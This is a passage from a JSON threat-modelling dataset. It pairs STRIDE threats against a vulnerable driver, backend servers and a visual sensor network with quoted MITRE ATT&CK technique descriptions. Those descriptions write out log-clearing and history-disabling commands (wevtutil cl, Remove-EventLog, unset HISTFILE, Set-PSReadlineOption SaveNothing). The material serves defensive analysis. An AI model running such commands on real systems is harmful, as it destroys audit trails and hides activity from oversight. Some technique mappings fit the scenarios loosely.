            "Scenario": "An attacker exploits the AMDPowerProfiler.sys driver vulnerability to execute code at high privilege levels.",
            "Assumptions": [
                {
                    "Assumption": "The vulnerable driver is installed on the system.",
                    "Role": "System Administrator",
                    "Condition": "Security patches and updates are outdated."
                },
                {
                    "Assumption": "The attacker has at least low-level access to the system.",
                    "Role": "Attacker",
                    "Condition": "Initial access to the system is gained."
                },
                {
                    "Assumption": "High privilege operations are not adequately monitored.",
                    "Role": "System Designer",
                    "Condition": "Privilege execution lacks proper monitoring."
                }
            ],
            "Potential Impact": "Privilege escalation, unauthorized access to critical operations.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Code Execution",
                "Driver",
                "Kernel"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a deserialization vulnerability to gain higher privileges within the application environment.",
            "Assumptions": [
                {
                    "Assumption": "The application does not securely handle deserialization of user inputs.",
                    "Role": "Application Developer",
                    "Condition": "Deserialization process is flawed."
                },
                {
                    "Assumption": "The attacker can inject malicious serialized objects.",
                    "Role": "Attacker",
                    "Condition": "Input validation is poor."
                },
                {
                    "Assumption": "Sensitive operations are accessible with elevated privileges.",
                    "Role": "System Administrator",
                    "Condition": "Access control for operations is weak."
                }
            ],
            "Potential Impact": "Privilege escalation, unauthorized access to restricted functionalities.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Deserialization",
                "Access Control",
                "Exploitation"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses the Hitachi Replication Manager vulnerability to inject and execute code with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Replication Manager is outdated and vulnerable.",
                    "Role": "System Administrator",
                    "Condition": "Security patches are not applied."
                },
                {
                    "Assumption": "The attacker can submit malicious commands to the Replication Manager.",
                    "Role": "Attacker",
                    "Condition": "System lacks input validation."
                },
                {
                    "Assumption": "Critical system functions are accessible via injected commands.",
                    "Role": "System Designer",
                    "Condition": "Command execution lacks isolation."
                }
            ],
            "Potential Impact": "Privilege escalation, control over critical system functions.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Code Injection",
                "Replication",
                "Kernel"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "8",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof one of the visual sensor nodes to insert false video feeds.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to a visual sensor node.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access granted."
                },
                {
                    "Assumption": "There is a lack of cryptographic authentication between sensor nodes.",
                    "Role": "System Architect",
                    "Condition": "Authentication not implemented."
                },
                {
                    "Assumption": "The attacker has the technical ability to mimic the node's communication protocol.",
                    "Role": "Attacker",
                    "Condition": "Advanced technical skills."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, data integrity tampering.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Network",
                "Device",
                "Communication Protocol"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user\u2019s session to access live video feeds.",
            "Assumptions": [
                {
                    "Assumption": "Session management is vulnerable to hijacking.",
                    "Role": "System Architect",
                    "Condition": "Weak session management."
                },
                {
                    "Assumption": "The attacker has intercepted session tokens.",
                    "Role": "Attacker",
                    "Condition": "Man-in-the-middle attack."
                },
                {
                    "Assumption": "Session tokens are not adequately protected (e.g., lacking encryption).",
                    "Role": "Security Engineer",
                    "Condition": "Poor token protection."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive video data.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Session Hijacking",
                "Network",
                "Live Video"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses spear-phishing to gain access to an admin account controlling the VSN.",
            "Assumptions": [
                {
                    "Assumption": "The admin is susceptible to phishing attacks.",
                    "Role": "Admin User",
                    "Condition": "Lack of phishing awareness."
                },
                {
                    "Assumption": "The attacker has crafted a convincing phishing message.",
                    "Role": "Attacker",
                    "Condition": "High skill in social engineering."
                },
                {
                    "Assumption": "There is no multi-factor authentication (MFA) in place.",
                    "Role": "System Architect",
                    "Condition": "MFA not implemented."
                }
            ],
            "Potential Impact": "Complete control of the system, unauthorized access to all visual data.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Phishing",
                "Account Compromise",
                "Admin Access"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker accesses and alters the firmware of a camera node.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the camera node.",
                    "Role": "Attacker",
                    "Condition": "Physical security is compromised."
                },
                {
                    "Assumption": "Firmware updates are not cryptographically signed and verified.",
                    "Role": "Developer",
                    "Condition": "Lack of firmware integrity checks."
                },
                {
                    "Assumption": "The device lacks secure boot mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Secure boot not implemented."
                }
            ],
            "Potential Impact": "Data integrity and availability are compromised.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Firmware",
                "Device",
                "Integrity"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into the VSN\u2019s backend server.",
            "Assumptions": [
                {
                    "Assumption": "The backend server has a known vulnerability (e.g., injection flaw).",
                    "Role": "System Administrator",
                    "Condition": "Server software is outdated."
                },
                {
                    "Assumption": "The attacker has network access to the server.",
                    "Role": "Attacker",
                    "Condition": "Network security is insufficient."
                },
                {
                    "Assumption": "Input validation is poor or nonexistent.",
                    "Role": "Developer",
                    "Condition": "Inadequate input sanitization."
                }
            ],
            "Potential Impact": "Data tampering, unauthorized actions on the server, potential system compromise.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Code Injection",
                "Server",
                "Backend"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker uses a software vulnerability to alter stored video data.",
            "Assumptions": [
                {
                    "Assumption": "Exploitable software vulnerability exists (e.g., CVE found).",
                    "Role": "System Administrator",
                    "Condition": "Vulnerability not patched."
                },
                {
                    "Assumption": "Stored video data is not encrypted or checksummed.",
                    "Role": "Data Manager",
                    "Condition": "Lack of data integrity mechanisms."
                },
                {
                    "Assumption": "Access permissions are poorly managed.",
                    "Role": "Security Engineer",
                    "Condition": "Insufficient access control."
                }
            ],
            "Potential Impact": "Data integrity and availability compromised.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data Storage",
                "Software Vulnerability",
                "Integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes or alters logs to hide unauthorized activities.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are not secured or tamper-proof.",
                    "Role": "System Administrator",
                    "Condition": "Logs are insecure."
                },
                {
                    "Assumption": "Logs do not have integrity checks.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of log integrity solutions."
                },
                {
                    "Assumption": "Insufficient monitoring or alerting on key log activities.",
                    "Role": "Security Analyst",
                    "Condition": "Missing monitoring tools."
                }
            ],
            "Potential Impact": "Loss of forensic information, difficulty in tracking unauthorized activities.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Log Tampering",
                "Forensic",
                "Audit"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user performs unauthorized actions and denies responsibility.",
            "Assumptions": [
                {
                    "Assumption": "Actions are not logged with enough detail.",
                    "Role": "System Architect",
                    "Condition": "Inadequate logging."
                },
                {
                    "Assumption": "Authentication mechanisms are weak.",
                    "Role": "Security Engineer",
                    "Condition": "Weak or no authentication."
                },
                {
                    "Assumption": "Audit trails are not reviewed regularly.",
                    "Role": "Security Analyst",
                    "Condition": "Lax auditing practices."
                }
            ],
            "Potential Impact": "Difficulty in determining accountability, potential tampering and disclosure of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "User Actions",
                "Audit",
                "Accountability"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider modifies system settings and denies making the changes.",
            "Assumptions": [
                {
                    "Assumption": "No non-repudiation mechanisms in place (e.g., digital signatures).",
                    "Role": "System Architect",
                    "Condition": "Non-repudiation not implemented."
                },
                {
                    "Assumption": "System settings changes are not adequately logged.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging."
                },
                {
                    "Assumption": "Access control is lax, allowing unauthorized changes.",
                    "Role": "Security Engineer",
                    "Condition": "Poor access controls."
                }
            ],
            "Potential Impact": "System settings altered without accountability, potential security risks.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Insider Threat",
                "System Settings",
                "Non-repudiation"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Autostart Execution",
                "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
                "id": "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf",
                "technique_id": "T1547"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts live video feeds transmitted over an unencrypted channel.",
            "Assumptions": [
                {
                    "Assumption": "Video feeds are transmitted without encryption.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption."
                },
                {
                    "Assumption": "The attacker has access to the network.",
                    "Role": "Attacker",
                    "Condition": "Network access available."
                },
                {
                    "Assumption": "The data is not protected by VPN or other secure methods.",
                    "Role": "Network Engineer",
                    "Condition": "No secure transport."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive video feeds.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Interception",
                "Network",
                "Video Transmission"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored on VSN nodes is accessed via an unpatched vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched software contains exploitable vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Vulnerabilities not patched."
                },
                {
                    "Assumption": "Sensitive data is stored without encryption.",
                    "Role": "Data Manager",
                    "Condition": "Data not encrypted."
                },
                {
                    "Assumption": "Network defenses are weak or misconfigured.",
                    "Role": "Network Engineer",
                    "Condition": "Inadequate network security."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of stored sensitive data.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Unpatched Vulnerability",
                "Data Storage",
                "Sensitive Data"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to backend server and extracts data.",
            "Assumptions": [
                {
                    "Assumption": "Backend server is vulnerable to attack (e.g., weak authentication).",
                    "Role": "System Administrator",
                    "Condition": "Weak server security."
                },
                {
                    "Assumption": "Data on the backend server is not encrypted or adequately protected.",
                    "Role": "Data Manager",
                    "Condition": "Lack of data protection."
                },
                {
                    "Assumption": "Access controls are insufficient to prevent unauthorized access.",
                    "Role": "Security Engineer",
                    "Condition": "Poor access controls."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of backend server data.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Server Access",
                "Data Extraction",
                "Backend"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
